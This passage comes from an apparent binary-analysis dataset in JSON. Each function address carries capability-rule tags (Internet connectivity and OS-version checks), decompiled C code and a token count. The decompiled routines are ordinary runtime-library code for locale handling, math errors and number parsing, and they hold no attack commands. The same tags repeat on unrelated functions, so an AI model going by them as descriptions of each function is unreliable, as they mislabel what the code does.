-0x30);\n                    *(unaff_EBP + -0x40) = uVar12;\n                    goto code_r0x00463890;\n                }\n                cVar5 = fcn.00403f7b(*(unaff_EBP + -0x48));\n                if (cVar5 != '\\0') {\ncode_r0x00463855:\n                    uVar10 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar10;\n                    if (0x7e < uVar10) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar8;\n                    goto code_r0x00463890;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    if (*(*(unaff_EBP + -0x34) + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    bVar13 = pcVar2[iVar11] == *(*(unaff_EBP + -0x34) + 5);\n                }\n                else {\n                    *(unaff_EBP + -0x54) = pcVar2[iVar11];\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x573000)(*(unaff_EBP + -0x54));\n                    uVar4 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x2a) = uVar4;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    *(unaff_EBP + -0x4c) = *(iVar7 + 5);\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x573000)(*(unaff_EBP + -0x4c));\n                    cVar5 = (*pcVar3)();\n                    uVar12 = *(unaff_EBP + -0x44);\n                    bVar13 = *(unaff_EBP + -0x2a) == cVar5;\n                }\n                if (!bVar13) goto code_r0x00463855;\n                uVar10 = *(unaff_EBP + -0x30);\n                cVar5 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar13) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar11 = iVar11 + *(iVar7 + uVar12);\ncode_r0x00463890:\n                cVar5 = *(unaff_EBP + -0x29);\n            }\n            uVar12 = uVar12 + 1;\n            *(unaff_EBP + -0x44) = uVar12;\n        } while (uVar12 < *(unaff_EBP + -0x3c));\n        if ((cVar5 == '\\0') || (cVar5 = fcn.00403f7b(*(unaff_EBP + -0x48)),  cVar5 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.00401c5d();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar10 = *(unaff_EBP + -0x30);\n    }\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 1858
    },
    "0040439f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040439f(code **param_1)\n\n{\n    *param_1 = vtable.std::locale::_Locimp.0;\n    fcn.0040631b(param_1);\n    if (param_1[6] != NULL) {\n        fcn.004040d9(param_1[6]);\n    }\n    param_1[6] = NULL;\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 106
    },
    "004043c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043c2(ulong *arg_8h, ulong *arg_ch, ulong *arg_10h, int32_t arg_14h)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_20h;\n    char *var_1ch;\n    ulong uStack28;\n    ulong uStack20;\n    ulong uStack12;\n    \n    if (*0x570708 == 0) {\n        pcVar2 = fcn.00402fae;\n    }\n    else {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x570748);\n    }\n    if (0x1a < arg_14h) {\n        if (arg_14h != 0x1b) {\n            if (arg_14h == 0x1c) {\n                var_1ch = 0x552494;\n            }\n            else if (arg_14h == 0x31) {\n                var_1ch = \"sqrt\";\n            }\n            else if (arg_14h == 0x3a) {\n                var_1ch = \"acos\";\n            }\n            else {\n                if (arg_14h != 0x3d) {\n                    if ((arg_14h != 1000) && (arg_14h != 0x3e9)) {\n                        return;\n                    }\n                    uVar1 = *arg_8h;\n                    goto code_r0x004ddf38;\n                }\n                var_1ch = \"asin\";\n            }\n            goto code_r0x004ddf98;\n        }\n        var_20h = 2;\ncode_r0x004ddfde:\n        var_1ch = 0x552494;\n        goto code_r0x004ddfe5;\n    }\n    if (arg_14h == 0x1a) {\n        uVar1 = 0x3ff0000000000000;\ncode_r0x004ddf38:\n        *arg_10h = uVar1;\n        return;\n    }\n    if (0xe < arg_14h) {\n        if (arg_14h == 0xf) {\n            var_1ch = 0x552490;\n        }\n        else {\n            if (arg_14h == 0x18) {\n                var_20h = 3;\n                goto code_r0x004ddfde;\n            }\n            if (arg_14h != 0x19) {\n                return;\n            }\n            var_1ch = 0x552494;\n        }\n        var_20h = 4;\n        uStack28 = *arg_8h;\n        uStack20 = *arg_ch;\n        uStack12 = *arg_10h;\n        (**0x573000)(&var_20h);\n        (*pcVar2)();\n        goto code_r0x004de01b;\n    }\n    if (arg_14h == 0xe) {\n        var_20h = 3;\n        var_1ch = 0x552490;\n    }\n    else {\n        if (arg_14h != 2) {\n            if (arg_14h == 3) {\n                var_1ch = 0x552498;\n            }\n            else {\n                if (arg_14h == 8) {\n                    var_20h = 2;\n                    var_1ch = 0x55249c;\n                    goto code_r0x004ddfe5;\n                }\n                if (arg_14h != 9) {\n                    return;\n                }\n                var_1ch = 0x55249c;\n            }\ncode_r0x004ddf98:\n            var_20h = 1;\n            uStack28 = *arg_8h;\n            uStack20 = *arg_ch;\n            uStack12 = *arg_10h;\n            (**0x573000)(&var_20h);\n            iVar3 = (*pcVar2)();\n            if (iVar3 == 0) {\n                puVar4 = fcn.004039a4();\n                *puVar4 = 0x21;\n            }\n            goto code_r0x004de01b;\n        }\n        var_20h = 2;\n        var_1ch = 0x552498;\n    }\ncode_r0x004ddfe5:\n    uStack28 = *arg_8h;\n    uStack20 = *arg_ch;\n    uStack12 = *arg_10h;\n    (**0x573000)(&var_20h);\n    iVar3 = (*pcVar2)();\n    if (iVar3 == 0) {\n        puVar4 = fcn.004039a4();\n        *puVar4 = 0x22;\n    }\ncode_r0x004de01b:\n    *arg_10h = uStack12;\n    return;\n}\n",
        "token_count": 1064
    },
    "004043c7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043c7(uint *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 3) == '\\0') {\n        iVar2 = fcn.00405a92(param_1[2] + 0x250, 0x55, *param_1, param_1[1]);\n        if (iVar2 != 0) {\n            fcn.004035f8(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "004043fe": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004043fe(int32_t arg_8h)\n\n{\n    if (*0x57004c == 0) {\n        if (arg_8h - 0x41U < 0x1a) {\n            arg_8h = arg_8h + 0x20;\n        }\n    }\n    else {\n        arg_8h = fcn.00401b7c(arg_8h, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 110
    },
    "00404449": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404449(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 240
    },
    "0040446c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040446c(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint32_t in_ECX;\n    uint32_t var_4h;\n    \n    var_4h = in_ECX;\n    if ((arg_14h != 10) || (var_4h = CONCAT31(in_ECX >> 8, 1),  -1 < arg_8h)) {\n        var_4h = var_4h & 0xffffff00;\n    }\n    fcn.004dba0b(arg_8h, arg_ch, arg_10h, arg_14h, var_4h);\n    return;\n}\n",
        "token_count": 169
    },
    "0040451b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0040451b(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    uint32_t arg_ch;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar1 = true;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    while( true ) {\n        if (**0x56f458 == '@') {\n            return arg_8h;\n        }\n        if (**0x56f458 == 'Z') {\n            return arg_8h;\n        }\n        if (bVar1) {\n            bVar1 = false;\n        }\n        else {\n            fcn.00403cba(0x2c);\n        }\n        pcVar2 = *0x56f458;\n        if (**0x56f458 == '\\0') break;\n        arg_ch = **0x56f458 - 0x30;\n        if (arg_ch < 10) {\n            *0x56f458 = *0x56f458 + 1;\n            arg_8h_00 = fcn.00401ee7(&var_18h, arg_ch);\n            fcn.00402eb9(arg_8h_00);\n        }\n        else {\n            var_8h = 0;\n            var_4h = 0;\n            fcn.00403625(&var_10h, &var_8h);\n            if ((1 < *0x56f458 - pcVar2) && (**0x56f44c != 9)) {\n                fcn.00405745(&var_10h);\n            }\n            fcn.00402eb9(&var_10h);\n            if (*0x56f458 == pcVar2) {\n                arg_8h[1] = 0;\n                *arg_8h = 0;\n                *(arg_8h + 1) = 2;\n            }\n        }\n        if (*(arg_8h + 1) != '\\0') {\n            return arg_8h;\n        }\n    }\n    if ('\\x01' < *(arg_8h + 1)) {\n        return arg_8h;\n    }\n    if (*arg_8h != 0) {\n        fcn.0040564b(0x54fa08);\n        return arg_8h;\n    }\n    fcn.00402e8c(1);\n    return arg_8h;\n}\n",
        "token_count": 567
    },
    "00404575": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1eh\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.00404575(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t iVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    int32_t iVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1eh;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0040536c(0xa0);\n    iVar13 = *(unaff_EBP + 0x18);\n    iVar2 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + 0xc);\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x1c);\n    fcn.0040327e(uVar14);\n    *(unaff_EBP + -4) = 0;\n    piVar6 = fcn.00404a89(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0xa8) = piVar6;\n    fcn.004050a6();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x573000)(unaff_EBP + -0x7c);\n    (*pcVar3)();\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.0040327e(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00403d87(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 1;\n    fcn.004050a6();\n    pcVar3 = *(*piVar6 + 0x2c);\n    (**0x573000)(0x54e49c, 0x54e4b9, unaff_EBP + -0x4c);\n    (*pcVar3)();\n    uVar14 = *(unaff_EBP + -0x84);\n    puVar15 = *(unaff_EBP + -0x9c);\n    *(unaff_EBP + -0x7e) = 0;\n    cVar4 = fcn.0040640b(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar15 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.004050a1();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0046ed79;\n            *puVar15 = 0x2d;\n        }\n        puVar15 = puVar15 + 1;\n        fcn.004027a2();\n    }\ncode_r0x0046ed79:\n    *puVar15 = 0x7830;\n    puVar15 = puVar15 + 1;\n    *(unaff_EBP + -0x7d) = 0;\n    *(unaff_EBP + -0x98) = puVar15;\n    *(unaff_EBP + -0x90) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    cVar4 = fcn.0040640b(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        if (*(iVar2 + 6) == *(unaff_EBP + -0x4c)) {\n            fcn.004027a2();\n            cVar4 = fcn.0040640b(uVar14);\n            if (cVar4 == '\\0') {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                iVar10 = *(iVar2 + 6);\n                if (iVar10 != *(unaff_EBP + -0x1a)) {\n                    if (*(iVar2 + 4) == '\\0') {\n                        fcn.004050a1();\n                        iVar10 = *(iVar2 + 6);\n                    }\n                    if (iVar10 != *(unaff_EBP + -0x1c)) goto code_r0x0046ee03;\n                }\n                fcn.004027a2();\n            }\n            else {\ncode_r0x0046ee03:\n                *(unaff_EBP + -0x7d) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0xa0) = ((**(unaff_EBP + -0xac) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x7c;\n    *(unaff_EBP + -0x94) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x68)) {\n        pcVar12 = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x94) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar4 = fcn.0040640b(uVar14);\n        if (cVar4 == '\\0') {\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                uVar7 = fcn.00402022(unaff_EBP + -0x4c, *(iVar2 + 6));\n                if (0x15 < uVar7) break;\n                iVar13 = *(unaff_EBP + -0x90);\n                if (*(unaff_EBP + -0xa0) == iVar13 || *(unaff_EBP + -0xa0) < iVar13) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar13 != 0)) {\n                    *puVar15 = *(uVar7 + 0x54e49c);\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x90) = iVar13 + 1;\n                }\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.004027a2();\n                cVar4 = fcn.0040640b(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x98) = puVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x6c) == 0) {\n            *(unaff_EBP + -0x88) = 0;\n        }\n        else {\n            uVar7 = fcn.00405691();\n            *(unaff_EBP + -0x88) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0xf;\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040654b(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar13 = 0;\n        cVar4 = fcn.0040640b(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x50);\n            iVar8 = *(unaff_EBP + -100);\ncode_r0x0046efc2:\n            do {\n                pcVar12 = *(unaff_EBP + -0x94);\n                while( true ) {\n                    if ((iVar13 == 0) || (cVar4 = *pcVar12,  cVar4 == '\\x7f')) goto code_r0x0046f039;\n                    iVar13 = iVar13 + -1;\n                    if (iVar13 != 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 != *(*(unaff_EBP + -0x88) + iVar13)) goto code_r0x0046f035;\n                    }\n                    if (iVar13 == 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 < **(unaff_EBP + -0x88)) goto code_r0x0046f035;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x94) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x94) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.004050a1();\n            }\n            uVar7 = fcn.00402022(unaff_EBP + -0x4c, *(iVar2 + 6));\n            if (uVar7 < 0x16) {\n                iVar8 = *(unaff_EBP + -0x90);\n                *(unaff_EBP + -0x7d) = 1;\n                if (*(unaff_EBP + -0xa0) == iVar8 || *(unaff_EBP + -0xa0) < iVar8) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *puVar15 = *(uVar7 + 0x54e49c);\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x98) = puVar15;\n                    *(unaff_EBP + -0x90) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -100;\n                if (0xf < *(unaff_EBP + -0x50)) {\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (*(iVar8 + iVar13) != '\\x7f') {\n                    iVar8 = unaff_EBP + -100;\n                    if (0xf < *(unaff_EBP + -0x50)) {\n                        iVar8 = *(unaff_EBP + -100);\n                    }\n                    *(iVar8 + iVar13) = *(iVar8 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x50);\n                iVar8 = *(unaff_EBP + -100);\n                iVar11 = unaff_EBP + -100;\n                if (0xf < uVar7) {\n                    iVar11 = iVar8;\n                }\n                if ((*(iVar11 + iVar13) == '\\0') || (*(unaff_EBP + -0x88) == 0)) goto code_r0x0046efa5;\n                iVar10 = *(iVar2 + 6);\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.004050a1();\n                    iVar10 = *(iVar2 + 6);\n                    uVar7 = *(unaff_EBP + -0x50);\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (iVar10 != *(unaff_EBP + -0x88)) goto code_r0x0046efa5;\n                fcn.00404476(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004027a2();\n            cVar4 = fcn.0040640b(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        uVar7 = *(unaff_EBP + -0x50);\n        iVar8 = *(unaff_EBP + -100);\ncode_r0x0046efa5:\n        if (iVar13 == 0) goto code_r0x0046efc2;\n        iVar11 = unaff_EBP + -100;\n        if (0xf < uVar7) {\n            iVar11 = iVar8;\n        }\n        if ('\\0' < *(iVar11 + iVar13)) {\n            iVar13 = iVar13 + 1;\n            goto code_r0x0046efc2;\n        }\ncode_r0x0046f035:\n        *(unaff_EBP + -0x7e) = 1;\ncode_r0x0046f039:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x94) = iVar8;\n            *(unaff_EBP + -0x88) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.00404070(unaff_EBP + -0x94, unaff_EBP + -0x88);\n                iVar8 = *(unaff_EBP + -0x94);\n            }\n            fcn.00401a32(iVar8);\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if ((*(unaff_EBP + -0x7d) != '\\0') && (*(unaff_EBP + -0x90) == 0)) {\n        *puVar15 = 0x30;\n        puVar15 = puVar15 + 1;\n        *(unaff_EBP + -0x98) = puVar15;\n    }\n    cVar4 = fcn.0040640b(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar10 = *(iVar2 + 6);\n        iVar5 = fcn.00403afd();\n        if (iVar10 == iVar5) {\n            puVar9 = fcn.00401366();\n            *puVar15 = **puVar9;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x98) = puVar15;\n            fcn.004027a2();\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if (*(unaff_EBP + -0x90) == 0) {\n        cVar4 = fcn.0040640b(uVar14);\n        if (cVar4 == '\\0') {\n            iVar13 = *(unaff_EBP + -0x8c);\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                iVar13 = iVar13 + -1;\n                fcn.004027a2();\n                cVar4 = fcn.0040640b(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x8c) = iVar13;\n            puVar15 = *(unaff_EBP + -0x98);\n        }\n        iVar13 = *(unaff_EBP + -0x8c);\n        if (iVar13 < 0) {\n            *puVar15 = 0x30;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x8c) = iVar13 + 1;\n        }\n    }\n    while (cVar4 = fcn.0040640b(uVar14),  cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        uVar7 = fcn.00402022(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) break;\n        iVar13 = *(unaff_EBP + -0x90);\n        if (iVar13 < *(unaff_EBP + -0xa0)) {\n            *puVar15 = *(uVar7 + 0x54e49c);\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x90) = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.004027a2();\n    }\n    cVar4 = *(unaff_EBP + -0x7d);\n    puVar16 = puVar15;\n    if (cVar4 == '\\0') goto code_r0x0046f38f;\n    cVar4 = fcn.0040640b(uVar14);\n    if (cVar4 != '\\0') {\ncode_r0x0046f38c:\n        cVar4 = *(unaff_EBP + -0x7d);\ncode_r0x0046f38f:\n        if ((*(unaff_EBP + -0x7e) != '\\0') || (cVar4 == '\\0')) {\n            puVar16 = *(unaff_EBP + -0x9c);\n        }\n        puVar9 = *(unaff_EBP + -0xac);\n        uVar14 = *(unaff_EBP + -0x8c);\n        *puVar16 = 0;\n        *puVar9 = uVar14;\n        fcn.004029b9();\n        fcn.004067d0();\n        return;\n    }\n    if (*(iVar2 + 4) == '\\0') {\n        fcn.004050a1();\n    }\n    iVar10 = *(iVar2 + 6);\n    if (iVar10 != *(unaff_EBP + -0x16)) {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n            iVar10 = *(iVar2 + 6);\n        }\n        if (iVar10 != *(unaff_EBP + -0x18)) goto code_r0x0046f38c;\n    }\n    *puVar15 = 0x70;\n    puVar16 = puVar15 + 1;\n    fcn.004027a2();\n    *(unaff_EBP + -0x7d) = 0;\n    iVar13 = 0;\n    cVar4 = fcn.0040640b(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar16 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.004050a1();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0046f2e7;\n            *puVar16 = 0x2d;\n        }\n        puVar16 = puVar15 + 1;\n        fcn.004027a2();\n    }\ncode_r0x0046f2e7:\n    cVar4 = fcn.0040640b(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        do {\n            cVar1 = *(iVar2 + 4);\n            cVar4 = *(unaff_EBP + -0x7d);\n            *(unaff_EBP + -0x7d) = cVar4;\n            if (cVar1 == '\\0') {\n                fcn.004050a1();\n                cVar4 = *(unaff_EBP + -0x7d);\n            }\n            if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) {\n                if (cVar4 == '\\0') goto code_r0x0046f33e;\n                break;\n            }\n            *(unaff_EBP + -0x7d) = 1;\n            fcn.004027a2();\n            cVar4 = fcn.0040640b(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        *puVar16 = 0x30;\n        puVar16 = puVar16 + 1;\n    }\ncode_r0x0046f33e:\n    do {\n        cVar4 = fcn.0040640b(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') goto code_r0x0046f38c;\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        uVar7 = fcn.00402022(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) goto code_r0x0046f38c;\n        if (iVar13 < 8) {\n            *puVar16 = *(uVar7 + 0x54e49c);\n            puVar16 = puVar16 + 1;\n            iVar13 = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.004027a2();\n    } while( true );\n}\n",
        "token_count": 5335
    },
    "00404593": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00404593(uint16_t *arg_8h, int32_t arg_ch, uint16_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint *puVar5;\n    uint16_t uVar6;\n    int32_t iVar7;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_14h;\n    uint32_t var_10h;\n    uint16_t *var_ch;\n    int32_t var_8h;\n    \n    if ((arg_8h == NULL) || (arg_ch == 0)) {\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    *arg_8h = 0;\n    if (arg_10h == NULL) {\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    fcn.004057e5(arg_1ch);\n    if (arg_18h == 0) {\n        arg_18h = *(var_1ch + 0x9c);\n    }\n    iVar7 = 0;\n    var_ch = arg_8h;\n    var_8h = arg_ch;\n    if (arg_ch != 0) {\n        do {\n            uVar2 = var_10h;\n            uVar6 = *arg_10h;\n            if (uVar6 == 0) break;\n            if (uVar6 == 0x25) {\n                if (arg_14h == 0) goto 